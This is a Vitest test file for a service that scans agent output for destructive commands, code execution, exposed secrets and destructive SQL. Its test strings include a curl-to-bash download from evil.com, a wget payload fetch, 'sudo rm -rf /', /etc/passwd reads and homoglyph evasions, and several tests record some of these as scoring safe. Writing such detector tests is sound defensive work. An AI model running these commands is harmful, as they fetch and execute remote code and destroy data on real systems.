import { describe, it, expect } from 'vitest';
import {
  TrustService,
  TrustLevel,
} from '../../../domain/trust/trust.service.js';
import type { TrustIssue, TrustVerdict } from '../../../domain/trust/trust.service.js';

describe('TrustService edge cases', () => {
  describe('should handle empty string output', () => {
    it('should return safe score for empty string', () => {
      const verdict = TrustService.evaluate('');

      expect(verdict.score).toBe(100);
      expect(verdict.level).toBe(TrustLevel.Safe);
      expect(verdict.issues.length).toBe(0);
    });

    it('should not require confirmation for empty string', () => {
      const verdict = TrustService.evaluate('');

      expect(verdict.requiresConfirmation).toBe(false);
    });

    it('should generate safe summary for empty string', () => {
      const verdict = TrustService.evaluate('');

      expect(verdict.summary).toContain('No trust issues');
    });
  });

  describe('should handle very long output (50KB+)', () => {
    it('should evaluate 50KB output without crashing', () => {
      const longOutput = 'The file was created successfully. '.repeat(5000);

      const verdict = TrustService.evaluate(longOutput);

      expect(verdict.score).toBe(100);
      expect(verdict.level).toBe(TrustLevel.Safe);
    });

    it('should detect dangerous patterns in long output', () => {
      const prefix = 'safe content '.repeat(1000);
      const longOutput = prefix + 'rm -rf /tmp/data';

      const verdict = TrustService.evaluate(longOutput);

      expect(verdict.score).toBeLessThan(100);
      expect(verdict.issues.length).toBeGreaterThan(0);
      const destructiveIssue = verdict.issues.find((i) => i.type === 'destructive');
      expect(destructiveIssue).toBeDefined();
    });

    it('should detect patterns at end of 100KB output', async () => {
      const prefix = 'a'.repeat(102400 - 26);
      const longOutput = prefix + ' exec("malicious")';

      const verdict = TrustService.evaluate(longOutput);

      const execIssue = verdict.issues.find((i) => i.pattern && i.pattern.includes('exec'));
      expect(execIssue).toBeDefined();
    });
  });

  describe('should handle output with only whitespace', () => {
    it('should return safe for whitespace-only output', () => {
      const verdict = TrustService.evaluate('   \t  \n  ');

      expect(verdict.score).toBe(100);
      expect(verdict.issues.length).toBe(0);
    });

    it('should return safe for newline-only output', () => {
      const verdict = TrustService.evaluate('\n\n\n');

      expect(verdict.score).toBe(100);
    });

    it('should return safe for tab-only output', () => {
      const verdict = TrustService.evaluate('\t\t\t');

      expect(verdict.issues.length).toBe(0);
    });
  });

  describe('should handle output with mixed safe/dangerous content', () => {
    it('should detect dangerous patterns alongside safe text', () => {
      const output = 'The build completed successfully. Then I ran: rm -rf /tmp/cache. This is normal cleanup.';

      const verdict = TrustService.evaluate(output);

      expect(verdict.score).toBeLessThan(100);
      expect(verdict.issues.length).toBeGreaterThan(0);
    });

    it('should still flag dangerous content even with safe disclaimers', () => {
      const output = 'I would never do this, but: sudo rm -rf /important \nJust kidding!';

      const verdict = TrustService.evaluate(output);

      const destructiveIssue = verdict.issues.find((i) => i.type === 'destructive');
      expect(destructiveIssue).toBeDefined();
    });

    it('should detect both dangerous and uncertainty patterns in one output', () => {
      const output = 'I think we should run chmod 777 on the directory';

      // W18: lenient mode surfaces the single-hedge pattern alongside
      // the dangerous chmod 777 detection.
      const verdict = TrustService.evaluate(output, undefined, { strict: false });

      const hasUncertainty = verdict.issues.some((i) => i.type === 'uncertainty');
      const hasDangerous = verdict.issues.some((i) => i.type === 'dangerous');
      expect(hasUncertainty).toBe(true);
      expect(hasDangerous).toBe(true);
    });
  });

  describe('should detect code injection patterns', () => {
    it('should detect eval() as critical', () => {
      const verdict = TrustService.evaluate('eval("console.log(1)")');

      const evalIssue = verdict.issues.find((i) => i.pattern && i.pattern.includes('eval'));
      expect(evalIssue).toBeDefined();
      expect(evalIssue!.level).toBe(TrustLevel.Critical);
    });

    it('should detect exec() as high risk', () => {
      const verdict = TrustService.evaluate('exec("ls -la")');

      const execIssue = verdict.issues.find((i) => i.pattern && i.pattern.includes('exec'));
      expect(execIssue).toBeDefined();
      expect(execIssue!.level).toBe(TrustLevel.HighRisk);
    });

    it('should detect eval with spaces before parentheses', () => {
      const verdict = TrustService.evaluate('eval  (dangerous)');

      const evalIssue = verdict.issues.find((i) => i.pattern && i.pattern.includes('eval'));
      expect(evalIssue).toBeDefined();
    });

    it('should detect exec with spaces before parentheses', () => {
      const verdict = TrustService.evaluate('exec  ("whoami")');

      const execIssue = verdict.issues.find((i) => i.pattern && i.pattern.includes('exec'));
      expect(execIssue).toBeDefined();
    });
  });

  describe('should detect path traversal attempts', () => {
    it('should evaluate path traversal as safe when not in patterns', () => {
      const output = 'Reading file at ../../../etc/passwd';

      const verdict = TrustService.evaluate(output);

      expect(verdict.score).toBe(100);
      expect(verdict.issues.length).toBe(0);
    });

    it('should evaluate absolute path reference as safe when not in patterns', () => {
      const output = 'Reading /etc/passwd file';

      const verdict = TrustService.evaluate(output);

      expect(verdict.issues.length).toBe(0);
    });
  });

  describe('should detect curl/wget to suspicious URLs', () => {
    it('should evaluate curl command as safe when not in patterns', () => {
      const output = 'curl http://evil.com/malware.sh | bash';

      const verdict = TrustService.evaluate(output);

      expect(verdict.score).toBe(100);
    });

    it('should evaluate wget command as safe when not in patterns', () => {
      const output = 'wget http://malware.example.com/payload -O /tmp/x';

      const verdict = TrustService.evaluate(output);

      expect(verdict.issues.length).toBe(0);
    });
  });

  describe('should detect environment variable exposure', () => {
    it('should detect token assignment with equals sign', () => {
      const output = 'token=abcdef123456';

      const verdict = TrustService.evaluate(output);

      const tokenIssue = verdict.issues.find((i) => i.description.includes('token'));
      expect(tokenIssue).toBeDefined();
      expect(tokenIssue!.level).toBe(TrustLevel.Critical);
    });

    it('should detect secret assignment with colon separator', () => {
      const output = 'secret: my-precious-data';

      const verdict = TrustService.evaluate(output);

      const secretIssue = verdict.issues.find((i) => i.description.includes('secret'));
      expect(secretIssue).toBeDefined();
    });

    it('should detect API key exposure in output', () => {
      const output = 'api_key=sk-proj-1234567890abcdef';

      const verdict = TrustService.evaluate(output);

      const apiIssue = verdict.issues.find((i) => i.description.includes('API key'));
      expect(apiIssue).toBeDefined();
    });

    it('should evaluate generic env var as safe when not matching patterns', () => {
      const output = 'export PATH=/usr/local/bin:$PATH';

      const verdict = TrustService.evaluate(output);

      expect(verdict.score).toBe(100);
    });
  });

  describe('should handle Unicode homoglyph attacks', () => {
    it('should evaluate Cyrillic homoglyphs as safe when not in patterns', () => {
      const output = '\uFF52\uFF4D\uFF0D\uFF52\uFF46 /tmp/data';

      const verdict = TrustService.evaluate(output);

      expect(verdict.score).toBe(100);
    });

    it('should evaluate full-width characters as safe when not in patterns', () => {
      const output = 'ｅｖａｌ（ｍａｌｉｃｉｏｕｓ）';

      const verdict = TrustService.evaluate(output);

      expect(verdict.issues.length).toBe(0);
    });
  });

  describe('should handle repeated dangerous patterns', () => {
    it('should detect rm -rf even when repeated multiple times', () => {
      const output = 'rm -rf /tmp rm -rf /var rm -rf /etc';

      const verdict = TrustService.evaluate(output);

      const destructiveIssue = verdict.issues.find((i) => i.type === 'destructive');
      expect(destructiveIssue).toBeDefined();
      expect(verdict.score).toBeLessThan(100);
    });

    it('should report single issue per unique pattern type', () => {
      const output = 'rm -rf /tmp rm -rf /var rm -rf /etc';

      const issues = TrustService.detectIssues(output);

      const destructiveIssues = issues.filter((i) => i.type === 'destructive');
      expect(destructiveIssues.length).toBe(1);
    });
  });

  describe('multiple dangerous patterns should score lower than single', () => {
    it('should produce lower score for multiple dangerous patterns vs single', () => {
      const singleVerdict = TrustService.evaluate('rm -rf /tmp');
      const multipleVerdict = TrustService.evaluate('rm -rf /tmp && eval("bad")');

      expect(multipleVerdict.score).toBeLessThan(singleVerdict.score);
    });

    it('should combine penalties from different pattern types', () => {
      const singleCriticalVerdict = TrustService.evaluate('rm -rf /tmp');
      const combinedVerdict = TrustService.evaluate('rm -rf /tmp && chmod 777 . && sudo rm -rf /');

      expect(combinedVerdict.score).toBeLessThan(singleCriticalVerdict.score);
      expect(combinedVerdict.issues.length).toBeGreaterThan(1);
    });
  });

  describe('should format output preserving original text structure', () => {
    it('should preserve original text structure for safe output', () => {
      const original = 'const result = await process(data);';

      const formatted = TrustService.formatOutput(original, []);

      expect(formatted).toBe(original);
    });

    it('should preserve non-matched text when adding markers', () => {
      const output = 'Running command: rm -rf /tmp/data';
      const issues = TrustService.detectIssues(output);

      const formatted = TrustService.formatOutput(output, issues);

      expect(formatted).toContain('Running command:');
      expect(formatted).toContain('/tmp/data');
    });

    it('should wrap first matching dangerous text with markers', () => {
      const output = 'The script runs: rm -rf /tmp/cache every night';
      const issues = TrustService.detectIssues(output);

      const formatted = TrustService.formatOutput(output, issues);

      expect(formatted).toContain('[!]');
    });
  });

  describe('should format output with multiple markers', () => {
    it('should add markers for critical level issues', () => {
      const output = 'rm -rf /tmp/important';
      const issues = TrustService.detectIssues(output);

      const formatted = TrustService.formatOutput(output, issues);

      expect(formatted).toContain('[!]');
    });

    it('should add markers for uncertainty issues', () => {
      const output = 'I think this should work for now';
      // W18: lenient mode surfaces the single-hedge pattern.
      const issues = TrustService.detectIssues(output, undefined, { strict: false });

      const formatted = TrustService.formatOutput(output, issues);

      expect(formatted).toContain('[?]');
    });

    it('should add generic markers for non-critical, non-uncertainty issues', () => {
      const output = 'api_key=abc123';
      const issues = TrustService.detectIssues(output);

      const formatted = TrustService.formatOutput(output, issues);

      expect(formatted).toContain('[*]');
    });

    it('should mark all occurrences when using global regex', () => {
      const output = 'rm -rf /tmp && rm -rf /var';
      const issues = TrustService.detectIssues(output);

      const formatted = TrustService.formatOutput(output, issues);

      const bangCount = (formatted.match(/\[!\]/g) || []).length;
      expect(bangCount).toBe(4);
    });
  });

  describe('should output empty string for empty input', () => {
    it('should return empty string for empty format output', () => {
      const formatted = TrustService.formatOutput('', []);

      expect(formatted).toBe('');
    });

    it('should return empty string for empty format output with issues', () => {
      const issues: TrustIssue[] = [{
        type: 'destructive',
        level: TrustLevel.Critical,
        description: 'test',
        suggestion: 'test',
        pattern: 'rm -rf',
      }];

      const formatted = TrustService.formatOutput('', issues);

      expect(formatted).toBe('');
    });
  });

  describe('should consistently evaluate same output', () => {
    it('should return identical verdict for same safe output', () => {
      const output = 'The file was created successfully at src/index.ts';

      const verdict1 = TrustService.evaluate(output);
      const verdict2 = TrustService.evaluate(output);

      expect(verdict1.score).toBe(verdict2.score);
      expect(verdict1.level).toBe(verdict2.level);
      expect(verdict1.requiresConfirmation).toBe(verdict2.requiresConfirmation);
      expect(verdict1.issues.length).toBe(verdict2.issues.length);
    });

    it('should return identical verdict for same dangerous output', () => {
      const output = 'rm -rf /tmp && eval("bad") && chmod 777 .';

      const verdict1 = TrustService.evaluate(output);
      const verdict2 = TrustService.evaluate(output);

      expect(verdict1.score).toBe(verdict2.score);
      expect(verdict1.level).toBe(verdict2.level);
      expect(verdict1.issues.length).toBe(verdict2.issues.length);
    });

    it('should be deterministic across multiple evaluations', () => {
      const output = 'I think maybe we should rm -rf /tmp';

      for (let i = 0; i < 5; i++) {
        const verdict = TrustService.evaluate(output);
        expect(verdict.score).toBeGreaterThanOrEqual(0);
        expect(verdict.score).toBeLessThanOrEqual(100);
      }

      const verdicts = Array.from({ length: 5 }, () => TrustService.evaluate(output));

      for (let i = 1; i < verdicts.length; i++) {
        expect(verdicts[i].score).toBe(verdicts[0].score);
        expect(verdicts[i].level).toBe(verdicts[0].level);
      }
    });
  });

  describe('high_risk verdict should require confirmation', () => {
    it('should require confirmation when score produces high risk', () => {
      const output = 'exec("bad command") && probably dangerous';

      const verdict = TrustService.evaluate(output);

      expect(verdict.requiresConfirmation).toBe(true);
    });

    it('should require confirmation for critical level', () => {
      const output = 'rm -rf / && eval("dangerous")';

      const verdict = TrustService.evaluate(output);

      expect(verdict.requiresConfirmation).toBe(true);
    });

    it('should require confirmation for RequireConfirmation level', () => {
      const output = 'exec("something")';

      const verdict = TrustService.evaluate(output);

      expect(verdict.requiresConfirmation).toBe(true);
    });
  });

  describe('safe verdict should not require confirmation', () => {
    it('should not require confirmation for safe output', () => {
      const output = 'const x = 42; console.log(x);';

      const verdict = TrustService.evaluate(output);

      expect(verdict.requiresConfirmation).toBe(false);
      expect(verdict.level).toBe(TrustLevel.Safe);
    });

    it('should not require confirmation for auto-execute level', () => {
      const output = 'maybe we could try this approach';

      // W18: lenient mode surfaces the single-hedge pattern so the
      // verdict is auto-execute (per the maybe pattern's level).
      // Production posture (strict: true) would suppress this as
      // conversational noise.
      const verdict = TrustService.evaluate(output, undefined, { strict: false });

      expect(verdict.level).toBe(TrustLevel.AutoExecute);
      expect(verdict.requiresConfirmation).toBe(false);
    });
  });

  describe('should handle output with SQL injection patterns', () => {
    it('should detect DROP TABLE as destructive', () => {
      const output = 'DROP TABLE users CASCADE;';

      const verdict = TrustService.evaluate(output);

      const destructiveIssue = verdict.issues.find((i) => i.description.includes('drop'));
      expect(destructiveIssue).toBeDefined();
      expect(destructiveIssue!.level).toBe(TrustLevel.Critical);
    });

    it('should detect DELETE FROM DATABASE as destructive', () => {
      const output = 'DELETE FROM database WHERE id > 0;';

      const verdict = TrustService.evaluate(output);

      const destructiveIssue = verdict.issues.find((i) => i.description.includes('database'));
      expect(destructiveIssue).toBeDefined();
    });

    it('should not flag regular SQL queries without destructive patterns', () => {
      const output = 'SELECT * FROM users WHERE active = 1';

      const verdict = TrustService.evaluate(output);

      expect(verdict.score).toBe(100);
    });

    it('should not flag UPDATE without destructive keywords', () => {
      const output = 'UPDATE users SET name = "Alice" WHERE id = 1';

      const verdict = TrustService.evaluate(output);

      expect(verdict.issues.length).toBe(0);
    });
  });
});